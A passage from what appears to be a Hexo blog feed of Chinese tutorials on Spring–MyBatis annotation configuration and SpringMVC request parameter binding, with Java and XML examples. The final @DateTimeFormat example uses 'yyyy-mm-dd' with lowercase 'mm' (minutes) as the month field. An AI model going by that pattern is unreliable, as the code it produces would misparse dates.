<h3 id="2-基于注解整合"><a href="#2-基于注解整合" class="headerlink" title="2.基于注解整合"></a>2.基于注解整合</h3><h4 id="①-Mybatis核心配置类的编写"><a href="#①-Mybatis核心配置类的编写" class="headerlink" title="① Mybatis核心配置类的编写"></a>① Mybatis核心配置类的编写</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactoryBean <span class="title function_">sqlSessionFactory</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBean</span>();</span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(<span class="string">&quot;com.tyt.domain&quot;</span>);</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MapperScannerConfigurer <span class="title function_">mapperScannerRegistrar</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">MapperScannerConfigurer</span> <span class="variable">msc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MapperScannerConfigurer</span>();</span><br><span class="line">        msc.setBasePackage(<span class="string">&quot;com.tyt.dao&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> msc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Mybatis配置类主要是将原Mybatis配置文件的<code>&lt;environment&gt;</code>以及<code>&lt;mapper&gt;</code>标签中的内容替换。</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155055.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815155055.png"></p>
<h4 id="②-获取数据源对象类"><a href="#②-获取数据源对象类" class="headerlink" title="② 获取数据源对象类"></a>② 获取数据源对象类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.driver&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String driver;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.username&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;jdbc.password&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        druidDataSource.setDriverClassName(driver);</span><br><span class="line">        druidDataSource.setUrl(url);</span><br><span class="line">        druidDataSource.setUsername(name);</span><br><span class="line">        druidDataSource.setPassword(password);</span><br><span class="line">        <span class="keyword">return</span> druidDataSource;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="③-Spring核心配置类"><a href="#③-Spring核心配置类" class="headerlink" title="③ Spring核心配置类"></a>③ Spring核心配置类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&#123;&quot;com.tyt&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PropertySource(&#123;&quot;jdbc.properties&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Import(&#123;JdbcConfig.class, MybatisConfig.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="④-测试代码-1"><a href="#④-测试代码-1" class="headerlink" title="④ 测试代码"></a>④ 测试代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">	<span class="type">ApplicationContext</span> <span class="variable">app</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(SpringConfig.class);</span><br><span class="line">	<span class="type">AccountService</span> <span class="variable">accountService</span> <span class="operator">=</span> app.getBean(AccountService.class);</span><br><span class="line">	<span class="type">Account</span> <span class="variable">account</span> <span class="operator">=</span> accountService.findById(<span class="number">1</span>);</span><br><span class="line">	System.out.println(account);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC数据响应与请求</title>
    <url>/posts/f3c7bc8f.html</url>
    <content><![CDATA[<h1 id="一、SpringMVC的数据请求"><a href="#一、SpringMVC的数据请求" class="headerlink" title="一、SpringMVC的数据请求"></a>一、SpringMVC的数据请求</h1><ul>
<li>客户端请求参数的格式是：<code>name=value&amp;age=value2……</code></li>
<li>服务器端要获得请求的参数，有时还需要进行数据的封装，SpringMVC可以接受的参数类型：<br>① 普通参数<br>② POJO类型参数 (实体bean)<br>③ 数组类型参数<br>④ 集合类型参数</li>
</ul>
<h2 id="1-获得普通参数"><a href="#1-获得普通参数" class="headerlink" title="1. 获得普通参数"></a>1. 获得普通参数</h2><p>Controller中的业务<code>方法的参数名称要与请求参数的name一致</code>，参数值会<code>自动映射</code>匹配。并且能自动做类型 转换；自动的类型转换是指从String向其他类型的转换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t1&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span> <span class="comment">// 表示不进行页面跳转 回写的数据为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(String username, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;username = &quot;</span> + username);</span><br><span class="line">	<span class="comment">// SpringMVC框架会自动将获取到的string类型的age转换为int类型的age</span></span><br><span class="line">	System.out.println(<span class="string">&quot;age = &quot;</span> + age); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-Get请求"><a href="#1-Get请求" class="headerlink" title="1. Get请求"></a>1. Get请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<hr>
<h3 id="2-Post请求"><a href="#2-Post请求" class="headerlink" title="2. Post请求"></a>2. Post请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<blockquote>
<ul>
<li><strong>Get请求普通传参</strong>：url地址传参，地址参数名与形参变量名相同，定义形参即可接受参数。</li>
<li><strong>Post请求普通传参</strong>：form表单传参，表单参数名与形参变量名相同，定义形参即可接受参数。</li>
</ul>
</blockquote>
<hr>
<h3 id="3-Post请求乱码处理"><a href="#3-Post请求乱码处理" class="headerlink" title="3. Post请求乱码处理"></a>3. Post请求乱码处理</h3><p><strong>可使用两种解决方法：</strong><br>① 若Sprign基于xml配置，可在web.xml添加如下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  配置全局乱码过滤器  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>② 若Spring基于注解开发，则可在SpringMVC核心配置类重写<code>getServletFilters()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContainersInitConfig</span> <span class="keyword">extends</span> <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;</span><br><span class="line">	<span class="comment">// Post请求乱码处理</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> Filter[] getServletFilters() &#123;</span><br><span class="line">		<span class="type">CharacterEncodingFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharacterEncodingFilter</span>();</span><br><span class="line">		filter.setEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Filter</span>[]&#123;filter&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-参数绑定注解-RequestParam"><a href="#4-参数绑定注解-RequestParam" class="headerlink" title="4. 参数绑定注解@RequestParam"></a>4. 参数绑定注解@RequestParam</h3><p>当请求的参数名称与Controller的业务方法参数名称不一致时，就需要通过<code>@RequestParam</code>注解显示的绑定 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;,required = false,defaultValue = &quot;tyt&quot;)</span> String username, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;username = &quot;</span> + username);</span><br><span class="line">	System.out.println(<span class="string">&quot;age = &quot;</span> + age); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<blockquote>
<p><strong>@RequestParam注解的三个属性：</strong></p>
<ul>
<li>value：请求参数名称</li>
<li>required ：默认值为true， 表示是否必须要携带该参数</li>
<li>defaultValue：默认值，当设置了默认值那么required就会失效</li>
</ul>
</blockquote>
<hr>
<h2 id="2-获得POJO类型参数"><a href="#2-获得POJO类型参数" class="headerlink" title="2. 获得POJO类型参数"></a>2. 获得POJO类型参数</h2><p>客户端发送的数据到达服务端之后，SpringMVC要将这些参数封装到一个实体类当中。原先我们要将请求参数封装到实体当中是怎样做的？通过getParamterMap获取参数map集合，然后通过beanUtils进行实体封装。SpringMVC框架封装了对实体封装的技术，我们只需要保证：</p>
<p>Controller中的<code>业务方法的POJO参数的属性名与请求参数的name一致</code>，参数值会<code>自动映射</code>匹配。 </p>
<p><strong>创建一个实体类User</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tyt.domain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span> User</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> 划水艺术家</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022/7/17 17:07</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Version</span> 1.0</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span>  String name;</span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line">	<span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, Integer age, String sex)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.name = name;</span><br><span class="line">		<span class="built_in">this</span>.age = age;</span><br><span class="line">		<span class="built_in">this</span>.sex = sex;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">		   <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">		   <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">		   <span class="string">&quot;, sex=&#x27;&quot;</span> + sex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">		   <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> sex;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.sex = sex;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t2&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span> <span class="comment">// 表示不进行页面跳转 回写的数据为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">(User user)</span> &#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;user = &quot;</span> + user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Get请求-1"><a href="#1-Get请求-1" class="headerlink" title="1. Get请求"></a>1. Get请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<hr>
<h3 id="2-Post请求-1"><a href="#2-Post请求-1" class="headerlink" title="2. Post请求"></a>2. Post请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<hr>
<h2 id="3-获得数组类型的参数"><a href="#3-获得数组类型的参数" class="headerlink" title="3. 获得数组类型的参数"></a>3. 获得数组类型的参数</h2><p>Controller中的<code>业务方法数组名称与请求参数的name一致</code>，参数值会<code>自动映射</code>匹配。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t3&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">(String[] array)</span>&#123;</span><br><span class="line">	System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Get请求-2"><a href="#1-Get请求-2" class="headerlink" title="1. Get请求"></a>1. Get请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154644.png"></p>
<hr>
<h3 id="2-Post请求-2"><a href="#2-Post请求-2" class="headerlink" title="2. Post请求"></a>2. Post请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h2 id="4-获得集合类型参数"><a href="#4-获得集合类型参数" class="headerlink" title="4. 获得集合类型参数"></a>4. 获得集合类型参数</h2><h3 id="1-简单集合类型参数获取"><a href="#1-简单集合类型参数获取" class="headerlink" title="1. 简单集合类型参数获取"></a>1. 简单集合类型参数获取</h3><p><strong>简单类型：例如<code>Integer</code>，<code>String</code>等。</strong></p>
<ul>
<li><strong>请求参数名与形参集合对象名相同且请求参数为多个，<code>@RequestParam</code>注解绑定参数关系</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t4&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">(<span class="meta">@RequestParam</span> List&lt;String&gt; list)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;list = &quot;</span> + list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="1-Get请求-3"><a href="#1-Get请求-3" class="headerlink" title="1. Get请求"></a>1. Get请求</h4><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h4 id="2-Post请求-3"><a href="#2-Post请求-3" class="headerlink" title="2. Post请求"></a>2. Post请求</h4><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h3 id="2-对象集合类型参数获取"><a href="#2-对象集合类型参数获取" class="headerlink" title="2. 对象集合类型参数获取"></a>2. 对象集合类型参数获取</h3><p><strong>对象集合不支持直接获取，可使用json数据传输。</strong></p>
<h1 id="二、json数据传递参数"><a href="#二、json数据传递参数" class="headerlink" title="二、json数据传递参数"></a>二、json数据传递参数</h1><p><strong>使用json作为传输数据格式时，需要引入相关坐标。</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>若使用注解开发，则在SpringMVC配置类中加上注解<code>@EnableWebMvc</code></strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ComponentScan(&quot;com.tyt.controller&quot;)</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span> <span class="comment">// 根据类型匹配对应的类型转换器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>若基于xml配置开发，则在spring-mvc配置文件配置处理器适配器：</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;messageConverters&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>当使用ajax或Postman提交时，必须指定<code>Content-Type</code>为<code>application/json</code>形式，在方法参数位置使用<code>@RequestBody</code>接收集合数据。</strong></li>
<li><strong>当使用ajax或Postman提交时，必须指定<code>Content-Type</code>为<code>application/json</code>形式，在方法参数位置使用<code>@RequestBody</code>接收集合数据。</strong></li>
<li><strong>当使用ajax或Postman提交时，必须指定<code>Content-Type</code>为<code>application/json</code>形式，在方法参数位置使用<code>@RequestBody</code>接收集合数据。</strong></li>
</ul>
<h2 id="1-传递简单数据"><a href="#1-传递简单数据" class="headerlink" title="1. 传递简单数据"></a>1. 传递简单数据</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/t5&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test5</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;String&gt; list)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;list = &quot;</span> + list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Get请求-4"><a href="#1-Get请求-4" class="headerlink" title="1. Get请求"></a>1. Get请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h3 id="2-Post请求-4"><a href="#2-Post请求-4" class="headerlink" title="2. Post请求"></a>2. Post请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h2 id="2-传递POJO类型数据"><a href="#2-传递POJO类型数据" class="headerlink" title="2. 传递POJO类型数据"></a>2. 传递POJO类型数据</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t6&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test6</span><span class="params">(<span class="meta">@RequestBody</span> User user)</span> &#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;user = &quot;</span> + user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Get请求-5"><a href="#1-Get请求-5" class="headerlink" title="1. Get请求"></a>1. Get请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h3 id="2-Post请求-5"><a href="#2-Post请求-5" class="headerlink" title="2. Post请求"></a>2. Post请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<hr>
<h2 id="3-传递对象集合类型数据"><a href="#3-传递对象集合类型数据" class="headerlink" title="3. 传递对象集合类型数据"></a>3. 传递对象集合类型数据</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/t7&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test7</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;User&gt; userList)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;userList = &quot;</span> + userList);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-Get请求-6"><a href="#1-Get请求-6" class="headerlink" title="1. Get请求"></a>1. Get请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154645.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<hr>
<h3 id="2-Post请求-6"><a href="#2-Post请求-6" class="headerlink" title="2. Post请求"></a>2. Post请求</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<h1 id="三、日期类型参数传递"><a href="#三、日期类型参数传递" class="headerlink" title="三、日期类型参数传递"></a>三、日期类型参数传递</h1><ul>
<li>日期类型数据基于系统不同格式也不尽相同<br>  2013-03-20<br>  2013&#x2F;03&#x2F;20<br>  03&#x2F;20&#x2F;2013<br>  ……</li>
</ul>
<h2 id="1-使用-DateTimeFormat注解"><a href="#1-使用-DateTimeFormat注解" class="headerlink" title="1. 使用 @DateTimeFormat注解"></a>1. 使用 @DateTimeFormat注解</h2><ul>
<li>使用 <code>@DateTimeFormat</code>注解，根据不同日期格式设置不同的接受方式</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t8&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test8</span><span class="params">(Date date,</span></span><br><span class="line"><span class="params">				<span class="meta">@DateTimeFormat(pattern = &quot;yyyy-mm-dd&quot;)</span> Date date1,</span></span><br><span class="line"><span class="params">				<span class="meta">@DateTimeFormat(pattern = &quot;yyyy-mm-dd hh:mm:ss&quot;)</span> Date date2)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;date = &quot;</span> + date);</span><br><span class="line">	System.out.println(<span class="string">&quot;date1 = &quot;</span> + date1);</span><br><span class="line">	System.out.println(<span class="string">&quot;date2 = &quot;</span> + date2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<hr>
